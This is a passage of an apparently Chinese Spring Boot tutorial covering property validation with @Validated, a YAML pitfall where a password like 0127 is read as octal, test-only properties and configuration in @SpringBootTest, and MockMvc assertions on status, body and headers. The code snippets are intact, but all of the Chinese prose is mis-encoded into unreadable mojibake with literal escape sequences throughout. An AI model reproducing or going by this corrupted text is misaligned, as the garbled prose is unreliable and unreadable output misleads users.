‡å‡†ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦é€‰æ‹©å¯¹åº”çš„æ ¡éªŒæ¡†æ¶ï¼Œæ­¤å¤„ä½¿ç”¨Hibernateæä¾›çš„æ ¡éªŒæ¡†æ¶æ¥ä½œä¸ºå®ç°è¿›è¡Œæ•°æ®æ ¡éªŒã€‚\n\n**æ­¥éª¤â‘ **ï¼šå¼€å¯æ ¡éªŒæ¡†æ¶\n\n```xml\n<!--1.å¯¼å…¥JSR303è§„èŒƒæ¥å£-->\n<dependency>\n    <groupId>javax.validation</groupId>\n    <artifactId>validation-api</artifactId>\n</dependency>\n<!--ä½¿ç”¨hibernateæ¡†æ¶æä¾›çš„æ ¡éªŒå™¨åšå®ç°-->\n<dependency>\n    <groupId>org.hibernate.validator</groupId>\n    <artifactId>hibernate-validator</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šåœ¨éœ€è¦å¼€å¯æ ¡éªŒåŠŸèƒ½çš„ç±»ä¸Šä½¿ç”¨æ³¨è§£@Validatedå¼€å¯æ ¡éªŒåŠŸèƒ½\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\n@Validated  //å¼€å¯å¯¹å½“å‰beançš„å±æ€§æ³¨å…¥æ ¡éªŒ\npublic class ServerConfig {\n}\n```\n\n**æ­¥éª¤â‘¢**ï¼šå¯¹å…·ä½“çš„å­—æ®µè®¾ç½®æ ¡éªŒè§„åˆ™\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\n//å¼€å¯å¯¹å½“å‰beançš„å±æ€§æ³¨å…¥æ ¡éªŒ\n@Validated\npublic class ServerConfig {\n    //è®¾ç½®å…·ä½“çš„è§„åˆ™\n    @Max(value = 8888,message = \"æœ€å¤§å€¼ä¸èƒ½è¶…è¿‡8888\")\n    @Min(value = 202,message = \"æœ€å°å€¼ä¸èƒ½ä½äº202\")\n    private int port;\n}\n```\n\né€šè¿‡è®¾ç½®æ•°æ®æ ¼å¼æ ¡éªŒï¼Œå°±å¯ä»¥æœ‰æ•ˆé¿å…éæ³•æ•°æ®åŠ è½½ã€‚\n\n### â‘¥å±æ€§æ³¨å…¥é—®é¢˜\n\nå…ˆæŠŠé—®é¢˜æè¿°ä¸€ä¸‹ï¼Œå¼€å‘è€…è¿æ¥æ•°æ®åº“æ“ä½œï¼Œä½†æ˜¯è¿è¡Œç¨‹åºåæ˜¾ç¤ºçš„ä¿¡æ¯æ˜¯å¯†ç é”™è¯¯ã€‚\n\n```bash\njava.sql.SQLException: Access denied for user 'root'@'localhost' (using password: YES)\n```\n\nè¿™æ˜¯ç”¨æˆ·åå’Œå¯†ç ä¸åŒ¹é…ï¼Œå°±æ˜¯å¯†ç è¾“å…¥é”™äº†ï¼Œä½†æ˜¯é—®é¢˜å°±åœ¨äºå¯†ç å¹¶æ²¡æœ‰è¾“å…¥é”™è¯¯ã€‚å¦‚æœæ˜¯åˆå­¦è€…ï¼Œä¼°è®¡è¿™ä¼šå¿ƒæ€å°±å´©äº†ï¼Œæˆ‘å¯†ç æ²¡é”™å•Šï¼Œä½ æ€ä¹ˆèƒ½è¯´æˆ‘æœ‰é”™è¯¯å‘¢ï¼Ÿæ¥çœ‹çœ‹ç”¨æˆ·åå¯†ç çš„é…ç½®æ˜¯å¦‚ä½•å†™çš„ï¼š\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n    username: root\n    password: 0127\n```\n\nè¿™åå¼€å‘è€…çš„ç”Ÿæ—¥æ˜¯1æœˆ27æ—¥ï¼Œæ‰€ä»¥å¯†ç å°±ä½¿ç”¨äº†0127ï¼Œå…¶å®é—®é¢˜å°±å‡ºåœ¨è¿™é‡Œäº†ã€‚\n\nåœ¨æ•´æ•°ç›¸å…³çŸ¥è¯†ä¸­æœ‰è¿™ä¹ˆä¸€å¥è¯ï¼Œ**æ”¯æŒäºŒè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶**\n\n<img src=\"https://img.jwt1399.top/img/202209131842566.png\" style=\"zoom:80%;\" />\n\nè¿™ä¸ªé—®é¢˜å°±å‡ºåœ¨è¿™é‡Œäº†ï¼Œå› ä¸º0127åœ¨å¼€å‘è€…çœ¼ä¸­æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²â€œ0127â€ï¼Œä½†æ˜¯åœ¨springbootçœ‹æ¥ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå…«è¿›åˆ¶çš„æ•°å­—ã€‚å½“åå°ä½¿ç”¨Stringç±»å‹æ¥æ”¶æ•°æ®æ—¶ï¼Œå¦‚æœé…ç½®æ–‡ä»¶ä¸­é…ç½®äº†ä¸€ä¸ªæ•´æ•°å€¼ï¼Œä»–æ˜¯å…ˆæŒ‰ç…§æ•´æ•°è¿›è¡Œå¤„ç†ï¼Œè¯»å–åå†è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å·§äº†ï¼Œ0127æ’ä¸Šäº†å…«è¿›åˆ¶çš„æ ¼å¼ï¼Œæ‰€ä»¥åå°å…ˆè½¬æ¢ä¸ºåè¿›åˆ¶æ•°å­—87å†è¯»å–ä¸ºâ€œ87â€ï¼Œè¿™å°±å¯¼è‡´å¯†ç é”™è¯¯çš„æŠ¥é”™ã€‚è§£å†³æ–¹æ³•ä¸ºåŠ ä¸Šå¼•å·\n\nè¿™é‡Œæä¸¤ä¸ªæ³¨æ„ç‚¹ï¼Œç¬¬ä¸€ï¼Œå­—ç¬¦ä¸²æ ‡å‡†ä¹¦å†™åŠ ä¸Šå¼•å·åŒ…è£¹ï¼Œå…»æˆä¹ æƒ¯ï¼Œç¬¬äºŒï¼Œé‡åˆ°0å¼€å¤´çš„æ•°æ®å¤šæ³¨æ„å§ã€‚\n\n## 3.æµ‹è¯•è¿›é˜¶\n\n### â‘ åŠ è½½æµ‹è¯•ä¸“ç”¨å±æ€§\n\næµ‹è¯•è¿‡ç¨‹æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œä½†æ˜¯å¾ˆå¤šæƒ…å†µä¸‹æµ‹è¯•æ—¶éœ€è¦æ¨¡æ‹Ÿä¸€äº›çº¿ä¸Šæƒ…å†µï¼Œæˆ–è€…æ¨¡æ‹Ÿä¸€äº›ç‰¹æ®Šæƒ…å†µã€‚å¦‚æœå½“å‰ç¯å¢ƒæŒ‰ç…§çº¿ä¸Šç¯å¢ƒå·²ç»è®¾å®šå¥½äº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬èƒ½ä¸èƒ½æ¯æ¬¡æµ‹è¯•çš„æ—¶å€™éƒ½å»ä¿®æ”¹æºç  application.yml ä¸­çš„é…ç½®è¿›è¡Œæµ‹è¯•å‘¢ï¼Ÿæ˜¾ç„¶æ˜¯ä¸è¡Œçš„ã€‚æ¯æ¬¡æµ‹è¯•å‰æ”¹è¿‡æ¥ï¼Œæ¯æ¬¡æµ‹è¯•åæ”¹å›å»ï¼Œè¿™å¤ªéº»çƒ¦äº†ã€‚äºæ˜¯æˆ‘ä»¬å°±æƒ³ï¼Œéœ€è¦åœ¨æµ‹è¯•ç¯å¢ƒä¸­åˆ›å»ºä¸€ç»„ä¸´æ—¶å±æ€§ï¼Œå»è¦†ç›–æˆ‘ä»¬æºç ä¸­è®¾å®šçš„å±æ€§ï¼Œè¿™æ ·æµ‹è¯•ç”¨ä¾‹å°±ç›¸å½“äºæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç¯å¢ƒï¼Œèƒ½å¤Ÿç‹¬ç«‹æµ‹è¯•ï¼Œè¿™æ ·å°±æ–¹ä¾¿å¤šäº†ã€‚\n\n**ä¸´æ—¶å±æ€§**\n\nSpringBootå·²ç»ä¸ºæˆ‘ä»¬å¼€å‘è€…æ—©å°±æƒ³å¥½äº†è¿™ç§é—®é¢˜è¯¥å¦‚ä½•è§£å†³ï¼Œå¹¶ä¸”æä¾›äº†å¯¹åº”çš„åŠŸèƒ½å…¥å£ã€‚åœ¨æµ‹è¯•ç”¨ä¾‹ç¨‹åºä¸­ï¼Œå¯ä»¥é€šè¿‡å¯¹æ³¨è§£@SpringBootTestæ·»åŠ å±æ€§æ¥æ¨¡æ‹Ÿä¸´æ—¶å±æ€§ï¼Œå…·ä½“å¦‚ä¸‹ï¼š\n\n```JAVA\n//propertieså±æ€§å¯ä»¥ä¸ºå½“å‰æµ‹è¯•ç”¨ä¾‹æ·»åŠ ä¸´æ—¶çš„å±æ€§é…ç½®\n@SpringBootTest(properties = {\"test.prop=testValue1\"})\npublic class PropertiesAndArgsTest {\n\n    @Value(\"${test.prop}\")\n    private String msg;\n    \n    @Test\n    void testProperties(){\n        System.out.println(msg);\n    }\n}\n```\n\nä½¿ç”¨æ³¨è§£@SpringBootTestçš„propertieså±æ€§å°±å¯ä»¥ä¸ºå½“å‰æµ‹è¯•ç”¨ä¾‹æ·»åŠ ä¸´æ—¶çš„å±æ€§ï¼Œè¦†ç›–æºç é…ç½®æ–‡ä»¶ä¸­å¯¹åº”çš„å±æ€§å€¼è¿›è¡Œæµ‹è¯•ã€‚\n\n**ä¸´æ—¶å‚æ•°**\n\né€šè¿‡å‘½ä»¤è¡Œå‚æ•°ä¹Ÿå¯ä»¥è®¾ç½®å±æ€§å€¼ã€‚è€Œä¸”çº¿ä¸Šå¯åŠ¨ç¨‹åºæ—¶ï¼Œé€šå¸¸éƒ½ä¼šæ·»åŠ ä¸€äº›ä¸“ç”¨çš„é…ç½®ä¿¡æ¯ã€‚\n\n```JAVA\n//argså±æ€§å¯ä»¥ä¸ºå½“å‰æµ‹è¯•ç”¨ä¾‹æ·»åŠ ä¸´æ—¶çš„å‘½ä»¤è¡Œå‚æ•°\n@SpringBootTest(args={\"--test.prop=testValue2\"})\npublic class PropertiesAndArgsTest {\n    \n    @Value(\"${test.prop}\")\n    private String msg;\n    \n    @Test\n    void testProperties(){\n        System.out.println(msg);\n    }\n}\n```\n\nä½¿ç”¨æ³¨è§£@SpringBootTestçš„argså±æ€§å°±å¯ä»¥ä¸ºå½“å‰æµ‹è¯•ç”¨ä¾‹æ¨¡æ‹Ÿå‘½ä»¤è¡Œå‚æ•°å¹¶è¿›è¡Œæµ‹è¯•ã€‚\n\n**æ€»ç»“**\n\nåŠ è½½æµ‹è¯•ä¸´æ—¶å±æ€§å¯ä»¥é€šè¿‡æ³¨è§£@SpringBootTestçš„propertieså’Œargså±æ€§è¿›è¡Œè®¾å®šï¼Œæ­¤è®¾å®šåº”ç”¨èŒƒå›´ä»…é€‚ç”¨äºå½“å‰æµ‹è¯•ç”¨ä¾‹\n\n### â‘¡åŠ è½½æµ‹è¯•ä¸“ç”¨é…ç½®\n\nä¸´æ—¶é…ç½®ä¸€äº›ä¸“ç”¨äºæµ‹è¯•ç¯å¢ƒçš„beançš„éœ€æ±‚ï¼Œç°åœ¨æˆ‘ä»¬çš„éœ€æ±‚å…¶å®å°±æ˜¯åœ¨æµ‹è¯•ç¯å¢ƒä¸­å†æ·»åŠ ä¸€ä¸ªé…ç½®ç±»ï¼Œç„¶åå¯åŠ¨æµ‹è¯•ç¯å¢ƒæ—¶ï¼Œç”Ÿæ•ˆæ­¤é…ç½®å°±è¡Œäº†ã€‚å…¶å®åšæ³•å’Œspringç¯å¢ƒä¸­åŠ è½½å¤šä¸ªé…ç½®ä¿¡æ¯çš„æ–¹å¼å®Œå…¨ä¸€æ ·ã€‚å…·ä½“æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š\n\n**æ­¥éª¤â‘ **ï¼šåœ¨æµ‹è¯•åŒ…testä¸­åˆ›å»ºä¸“ç”¨çš„æµ‹è¯•ç¯å¢ƒé…ç½®ç±»\n\n```java\n@Configuration\npublic class MsgConfig {\n    @Bean\n    public String msg(){\n        return \"bean msg\";\n    }\n}\n```\n\nä¸Šè¿°é…ç½®ä»…ç”¨äºæ¼”ç¤ºå½“å‰å®éªŒæ•ˆæœï¼Œå®é™…å¼€å‘å¯ä¸èƒ½è¿™ä¹ˆæ³¨å…¥Stringç±»å‹çš„æ•°æ®\n\n**æ­¥éª¤â‘¡**ï¼šåœ¨å¯åŠ¨æµ‹è¯•ç¯å¢ƒæ—¶ï¼Œå¯¼å…¥æµ‹è¯•ç¯å¢ƒä¸“ç”¨çš„é…ç½®ç±»ï¼Œä½¿ç”¨@Importæ³¨è§£å³å¯å®ç°\n\n```java\n@SpringBootTest\n@Import({MsgConfig.class})\npublic class ConfigurationTest {\n\n    @Autowired\n    private String msg;\n\n    @Test\n    void testConfiguration(){\n        System.out.println(msg);\n    }\n}\n```\n\nåˆ°è¿™é‡Œå°±é€šè¿‡@Importå±æ€§å®ç°äº†åŸºäºå¼€å‘ç¯å¢ƒçš„é…ç½®åŸºç¡€ä¸Šï¼Œå¯¹é…ç½®è¿›è¡Œæµ‹è¯•ç¯å¢ƒçš„è¿½åŠ æ“ä½œã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å®ç°æ¯ä¸€ä¸ªä¸åŒçš„æµ‹è¯•ç”¨ä¾‹åŠ è½½ä¸åŒçš„beançš„æ•ˆæœï¼Œä¸°å¯Œæµ‹è¯•ç”¨ä¾‹çš„ç¼–å†™ï¼ŒåŒæ—¶ä¸å½±å“å¼€å‘ç¯å¢ƒçš„é…ç½®ã€‚\n\n**æ€»ç»“**\n\nå®šä¹‰æµ‹è¯•ç¯å¢ƒä¸“ç”¨çš„é…ç½®ç±»ï¼Œç„¶åé€šè¿‡@Importæ³¨è§£åœ¨å…·ä½“çš„æµ‹è¯•ä¸­å¯¼å…¥ä¸´æ—¶çš„é…ç½®ï¼Œä¾‹å¦‚æµ‹è¯•ç”¨ä¾‹ï¼Œæ–¹ä¾¿æµ‹è¯•è¿‡ç¨‹ï¼Œä¸”ä¸Šè¿°é…ç½®ä¸å½±å“å…¶ä»–çš„æµ‹è¯•ç±»ç¯å¢ƒ\n\n### â‘¢Webç¯å¢ƒæ¨¡æ‹Ÿæµ‹è¯•\n\n> å½“å‰æˆ‘ä»¬å·²ç»å¯ä»¥å®ç°ä¸šåŠ¡å±‚å’Œæ•°æ®å±‚çš„æµ‹è¯•ï¼Œå¹¶ä¸”é€šè¿‡ä¸´æ—¶é…ç½®ï¼Œæ§åˆ¶æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹åŠ è½½ä¸åŒçš„æµ‹è¯•æ•°æ®ã€‚ä½†æ˜¯å®é™…ä¼ä¸šå¼€å‘ä¸ä»…è¦ä¿éšœä¸šåŠ¡å±‚ä¸æ•°æ®å±‚çš„åŠŸèƒ½å®‰å…¨æœ‰æ•ˆï¼Œä¹Ÿè¦ä¿éšœæ§åˆ¶å±‚çš„åŠŸèƒ½æ­£å¸¸ã€‚é‚£ä¹ˆå¦‚ä½•å¯¹æ§åˆ¶å±‚è¿›è¡Œæµ‹è¯•å‘¢ï¼Ÿ\n\nå¯¹æ§åˆ¶å±‚åŠŸèƒ½è¿›è¡Œæµ‹è¯•æœ‰ä¸‰ä¸ªè¦ç‚¹ï¼š\n\n- 1.è¿è¡Œæµ‹è¯•ç¨‹åºæ—¶ï¼Œå¿…é¡»å¯åŠ¨webç¯å¢ƒï¼Œä¸ç„¶æ²¡æ³•æµ‹è¯•webåŠŸèƒ½ã€‚\n- 2.å¿…é¡»åœ¨æµ‹è¯•ç¨‹åºä¸­å…·å¤‡å‘é€webè¯·æ±‚çš„èƒ½åŠ›ï¼Œä¸ç„¶æ— æ³•å®ç°webåŠŸèƒ½çš„æµ‹è¯•ã€‚\n- 3.æµ‹è¯•è¿‡ç¨‹å¿…é¡»å‡ºç°é¢„è®¡å€¼ä¸çœŸå®å€¼çš„æ¯”å¯¹ç»“æœæ‰èƒ½ç¡®è®¤æµ‹è¯•ç»“æœæ˜¯å¦é€šè¿‡ã€‚\n\nå› æ­¤æµ‹è¯•æ§åˆ¶å±‚æ¥å£è¿™é¡¹å·¥ä½œå°±è½¬æ¢æˆäº†ä¸‰ä»¶äº‹\n\n- 1.å¦‚ä½•åœ¨æµ‹è¯•ç±»ä¸­å¯åŠ¨webæµ‹è¯•\n- 2.å¦‚ä½•åœ¨æµ‹è¯•ç±»ä¸­å‘é€webè¯·æ±‚\n- 3.å¦‚ä½•åœ¨æµ‹è¯•ç±»è¿›è¡Œè¯·æ±‚ç»“æœæ¯”å¯¹\n\n**æµ‹è¯•ç±»ä¸­å¯åŠ¨webç¯å¢ƒ**\n\n@SpringBootTestæ³¨è§£å¸¦æœ‰ä¸€ä¸ªå±æ€§ï¼Œå«åšwebEnvironmentã€‚é€šè¿‡è¯¥å±æ€§å°±å¯ä»¥è®¾ç½®åœ¨æµ‹è¯•ç”¨ä¾‹ä¸­å¯åŠ¨webç¯å¢ƒï¼Œå…·ä½“å¦‚ä¸‹ï¼š\n\n```JAVA\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\npublic class WebTest {\t\n}\n```\n\nå¯ä»¥æŒ‡å®šå¯åŠ¨çš„Webç¯å¢ƒå¯¹åº”çš„ç«¯å£ï¼Œspringbootæä¾›äº†4ç§è®¾ç½®å€¼ï¼Œåˆ†åˆ«å¦‚ä¸‹ï¼š\n\n- MOCKï¼šæ ¹æ®å½“å‰è®¾ç½®ç¡®è®¤æ˜¯å¦å¯åŠ¨webç¯å¢ƒï¼Œä¾‹å¦‚ä½¿ç”¨äº†Servletçš„APIå°±å¯åŠ¨webç¯å¢ƒï¼Œå±äºé€‚é…æ€§çš„é…ç½®\n- DEFINED_PORTï¼šä½¿ç”¨è‡ªå®šä¹‰çš„ç«¯å£ä½œä¸ºwebæœåŠ¡å™¨ç«¯å£\n- RANDOM_PORTï¼šä½¿ç”¨éšæœºç«¯å£ä½œä¸ºwebæœåŠ¡å™¨ç«¯å£\n- NONEï¼šä¸å¯åŠ¨webç¯å¢ƒ\n\nå»ºè®®å¤§å®¶æµ‹è¯•æ—¶ä½¿ç”¨RANDOM_PORTï¼Œé¿å…ä»£ç ä¸­å› ä¸ºå†™æ­»è®¾å®šå¼•å‘çº¿ä¸ŠåŠŸèƒ½æ‰“åŒ…æµ‹è¯•æ—¶ç”±äºç«¯å£å†²çªå¯¼è‡´æ„å¤–ç°è±¡çš„å‡ºç°ã€‚\n\n**æµ‹è¯•ç±»ä¸­å‘é€è¯·æ±‚**\n\n**æ­¥éª¤â‘ **ï¼šåœ¨æµ‹è¯•ç±»ä¸­å¼€å¯webè™šæ‹Ÿè°ƒç”¨åŠŸèƒ½ï¼Œé€šè¿‡æ³¨è§£@AutoConfigureMockMvcå®ç°æ­¤åŠŸèƒ½çš„å¼€å¯\n\n```java\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\n@AutoConfigureMockMvc //å¼€å¯è™šæ‹ŸMVCè°ƒç”¨\npublic class WebTest {\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šå®šä¹‰å‘èµ·è™šæ‹Ÿè°ƒç”¨çš„å¯¹è±¡MockMVCï¼Œé€šè¿‡è‡ªåŠ¨è£…é…çš„å½¢å¼åˆå§‹åŒ–å¯¹è±¡\n\n```java\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\n@AutoConfigureMockMvc //å¼€å¯è™šæ‹ŸMVCè°ƒç”¨\npublic class WebTest {\n    @Test\n    void testWeb(@Autowired MockMvc mvc) {\n    }\n}\n```\n\n**æ­¥éª¤â‘¢**ï¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿè¯·æ±‚å¯¹è±¡ï¼Œå°è£…è¯·æ±‚çš„è·¯å¾„ï¼Œå¹¶ä½¿ç”¨MockMVCå¯¹è±¡å‘é€å¯¹åº”è¯·æ±‚\n\n```java\n@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)\n@AutoConfigureMockMvc //å¼€å¯è™šæ‹ŸMVCè°ƒç”¨\npublic class WebTest {\n    @Test\n    void testWeb(@Autowired MockMvc mvc) throws Exception {\n         //http://localhost:8080/books\n        //åˆ›å»ºè™šæ‹Ÿè¯·æ±‚ï¼Œå½“å‰è®¿é—®/books\n        MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n        //æ‰§è¡Œå¯¹åº”çš„è¯·æ±‚\n        mvc.perform(builder);\n    }\n}\n```\n\n**webç¯å¢ƒè¯·æ±‚ç»“æœæ¯”å¯¹**\n\n- å“åº”çŠ¶æ€åŒ¹é…\n\n  ```java\n  @Test\n  void testStatus(@Autowired MockMvc mvc) throws Exception {\n      MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n      ResultActions action = mvc.perform(builder);\n      //è®¾å®šé¢„æœŸå€¼ ä¸çœŸå®å€¼è¿›è¡Œæ¯”è¾ƒï¼ŒæˆåŠŸæµ‹è¯•é€šè¿‡ï¼Œå¤±è´¥æµ‹è¯•å¤±è´¥\n      //å®šä¹‰æœ¬æ¬¡è°ƒç”¨çš„é¢„æœŸå€¼\n      StatusResultMatchers status = MockMvcResultMatchers.status();\n      ResultMatcher ok = status.isOk(); //é¢„è®¡æœ¬æ¬¡è°ƒç”¨æ—¶æˆåŠŸçš„ï¼šçŠ¶æ€200\n      //æ·»åŠ é¢„è®¡å€¼åˆ°æœ¬æ¬¡è°ƒç”¨è¿‡ç¨‹ä¸­è¿›è¡ŒåŒ¹é…\n      action.andExpect(ok);\n  }\n  ```\n\n- å“åº”ä½“åŒ¹é…ï¼ˆéjsonæ•°æ®æ ¼å¼ï¼‰\n\n  ```java\n  @Test\n  void testBody(@Autowired MockMvc mvc) throws Exception {\n      MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n      ResultActions action = mvc.perform(builder);\n      //è®¾å®šé¢„æœŸå€¼ ä¸çœŸå®å€¼è¿›è¡Œæ¯”è¾ƒï¼ŒæˆåŠŸæµ‹è¯•é€šè¿‡ï¼Œå¤±è´¥æµ‹è¯•å¤±è´¥\n      //å®šä¹‰æœ¬æ¬¡è°ƒç”¨çš„é¢„æœŸå€¼\n      ContentResultMatchers content = MockMvcResultMatchers.content();\n      ResultMatcher result = content.string(\"springboot2\");\n      //æ·»åŠ é¢„è®¡å€¼åˆ°æœ¬æ¬¡è°ƒç”¨è¿‡ç¨‹ä¸­è¿›è¡ŒåŒ¹é…\n      action.andExpect(result);\n  }\n  ```\n\n- å“åº”ä½“åŒ¹é…ï¼ˆjsonæ•°æ®æ ¼å¼ï¼Œå¼€å‘ä¸­çš„ä¸»æµä½¿ç”¨æ–¹å¼ï¼‰\n\n  ```java\n  @Test\n  void testJson(@Autowired MockMvc mvc) throws Exception {\n      MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n      ResultActions action = mvc.perform(builder);\n      //è®¾å®šé¢„æœŸå€¼ ä¸çœŸå®å€¼è¿›è¡Œæ¯”è¾ƒï¼ŒæˆåŠŸæµ‹è¯•é€šè¿‡ï¼Œå¤±è´¥æµ‹è¯•å¤±è´¥\n      //å®šä¹‰æœ¬æ¬¡è°ƒç”¨çš„é¢„æœŸå€¼\n      ContentResultMatchers content = MockMvcResultMatchers.content();\n      ResultMatcher result = content.json(\"{\\\"id\\\":1,\\\"name\\\":\\\"springboot2\\\",\\\"type\\\":\\\"springboot\\\"}\");\n      //æ·»åŠ é¢„è®¡å€¼åˆ°æœ¬æ¬¡è°ƒç”¨è¿‡ç¨‹ä¸­è¿›è¡ŒåŒ¹é…\n      action.andExpect(result);\n  }\n  ```\n\n- å“åº”å¤´ä¿¡æ¯åŒ¹é…\n\n  ```java\n  @Test\n  void testContentType(@Autowired MockMvc mvc) throws Exception {\n      MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n      ResultActions action = mvc.perform(builder);\n      //è®¾å®šé¢„æœŸå€¼ ä¸çœŸå®å€¼è¿›è¡Œæ¯”è¾ƒï¼ŒæˆåŠŸæµ‹è¯•é€šè¿‡ï¼Œå¤±è´¥æµ‹è¯•å¤±è´¥\n      //å®šä¹‰æœ¬æ¬¡è°ƒç”¨çš„é¢„æœŸå€¼\n      HeaderResultMatchers header = MockMvcResultMatchers.header();\n      ResultMatcher contentType = header.string(\"Content-Type\", \"application/json\");\n      //æ·»åŠ é¢„è®¡å€¼åˆ°æœ¬æ¬¡è°ƒç”¨è¿‡ç¨‹ä¸­è¿›è¡ŒåŒ¹é…\n      action.andExpect(contentType);\n  }\n  ```\n\nå¤´ä¿¡æ¯ï¼Œæ­£æ–‡ä¿¡æ¯ï¼ŒçŠ¶æ€ä¿¡æ¯éƒ½æœ‰äº†ï¼Œå°±å¯ä»¥ç»„åˆå‡ºä¸€ä¸ªå®Œç¾çš„å“åº”ç»“æœæ¯”å¯¹ç»“æœäº†ã€‚ä»¥ä¸‹èŒƒä¾‹å°±æ˜¯ä¸‰ç§ä¿¡æ¯åŒæ—¶è¿›è¡ŒåŒ¹é…æ ¡éªŒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå®Œæ•´çš„ä¿¡æ¯åŒ¹é…è¿‡ç¨‹ã€‚\n\n```java\n@Test\nvoid testGetById(@Autowired MockMvc mvc) throws Exception {\n    MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get(\"/books\");\n    ResultActions action = mvc.perform(builder);\n    //æ¯”çŠ¶æ€ä¿¡æ¯\n    StatusResultMatchers status = MockMvcResultMatchers.status();\n    ResultMatcher ok = status.isOk();\n    action.andExpect(ok);\n    //æ¯”å¯¹å¤´ä¿¡æ¯\n    HeaderResultMatchers header = MockMvcResultMatchers.header();\n    ResultMatcher contentType = header.string(\"Content-Type\", \"application/json\");\n    action.andExpect(contentType);\n    //æ¯”æ­£æ–‡ä¿¡æ¯\n    ContentResultMatchers content = MockMvcResultMatchers.content();\n    ResultMatcher result = content.json(\"{\\\"id\\\":1,\\\"name\\\":\\\"springboot\\\",\\\"type\\\":\\\"springboot\\\"}\");\n    action.andExpect(result);\n}\n```\n\n**æ€»ç»“**\n\n1. åœ¨æµ‹è¯•ç±»ä¸­æµ‹è¯•webå±‚æ¥å£è¦ä¿éšœæµ‹è¯•ç±»å¯åŠ¨æ—¶å¯åŠ¨webå®¹å™¨ï¼Œä½¿ç”¨@SpringBootTestæ³¨è§£çš„webEnvironmentå±æ€§å¯ä»¥è™šæ‹Ÿwebç¯å¢ƒç”¨äºæµ‹è¯•\n2. ä¸ºæµ‹è¯•æ–¹æ³•æ³¨å…¥MockMvcå¯¹è±¡ï¼Œé€šè¿‡MockMvcå¯¹è±¡å¯ä»¥å‘é€è™šæ‹Ÿè¯·æ±‚ï¼Œæ¨¡æ‹Ÿwebè¯·æ±‚è°ƒç”¨è¿‡ç¨‹\n3. webè™šæ‹Ÿè°ƒç”¨å¯ä»¥å¯¹æœ¬åœ°è™šæ‹Ÿè¯·æ±‚çš„è¿”å›å“åº”ä¿¡æ¯è¿›è¡Œæ¯”å¯¹ï¼Œåˆ†ä¸ºå“åº”å¤´ä¿¡æ¯æ¯”å¯¹ã€å“åº”ä½“ä¿¡æ¯æ¯”å¯¹ã€å“åº”çŠ¶æ€ä¿¡æ¯æ¯”å¯¹\n\n### â‘£æ•°æ®å±‚æµ‹è¯•å›æ»š\n\n> æµ‹è¯•ç”¨ä¾‹å¼€å‘å®Œæˆåï¼Œåœ¨æ‰“åŒ…çš„é˜¶æ®µç”±äºtestç”Ÿå‘½å‘¨æœŸå±äºå¿…é¡»è¢«è¿è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œå¦‚æœè·³è¿‡ä¼šç»™ç³»ç»Ÿå¸¦æ¥æé«˜çš„å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥æµ‹è¯•ç”¨ä¾‹å¿…é¡»æ‰§è¡Œã€‚ä½†æ˜¯æ–°çš„é—®é¢˜å°±å‘ˆç°äº†ï¼Œæµ‹è¯•ç”¨ä¾‹å¦‚æœæµ‹è¯•æ—¶äº§ç”Ÿäº†äº‹åŠ¡æäº¤å°±ä¼šåœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å¯¹æ•°æ®åº“æ•°æ®äº§ç”Ÿå½±å“ï¼Œè¿›è€Œäº§ç”Ÿåƒåœ¾æ•°æ®ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸æ˜¯æˆ‘ä»¬å¸Œæœ›å‘ç”Ÿçš„ï¼Œ\n>\n> ä½œä¸ºå¼€å‘è€…å¸Œæœ›æµ‹è¯•ç”¨ä¾‹æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ•°æ®ä¸è¦åœ¨æˆ‘çš„ç³»ç»Ÿä¸­ç•™ç—•ï¼Œè¿™æ ·è¯¥å¦‚ä½•å¤„ç†å‘¢ï¼Ÿ\n\nspringbootæ—©å°±ä¸ºå¼€å‘è€…æƒ³åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¹¶ä¸”é’ˆå¯¹æ­¤é—®é¢˜ç»™å‡ºäº†æœ€ç®€è§£å†³æ–¹æ¡ˆï¼Œåœ¨åŸå§‹æµ‹è¯•ç”¨ä¾‹ä¸­æ·»åŠ 